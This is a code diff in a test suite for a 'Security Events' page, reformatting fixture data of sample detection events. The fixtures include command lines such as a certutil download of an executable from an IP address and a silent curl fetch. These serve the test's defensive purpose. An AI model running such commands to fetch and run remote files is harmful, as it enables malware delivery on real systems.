@@ -814,10 +814,7 @@ describe("the Security Events page", () => {
       ruleName: ["rule one", "rule two"],
       productName: ["Falco", "auditd"],
       processName: ["powershell.exe", "cmd.exe"],
-      processPath: [
-        "C:\\Windows\\System32\\certutil.exe",
-        "/usr/bin/curl",
-      ],
+      processPath: ["C:\\Windows\\System32\\certutil.exe", "/usr/bin/curl"],
       processCommandLine: [
         "certutil -urlcache -f http://203.0.113.7/a.exe",
         "curl -s https://get.example/x",
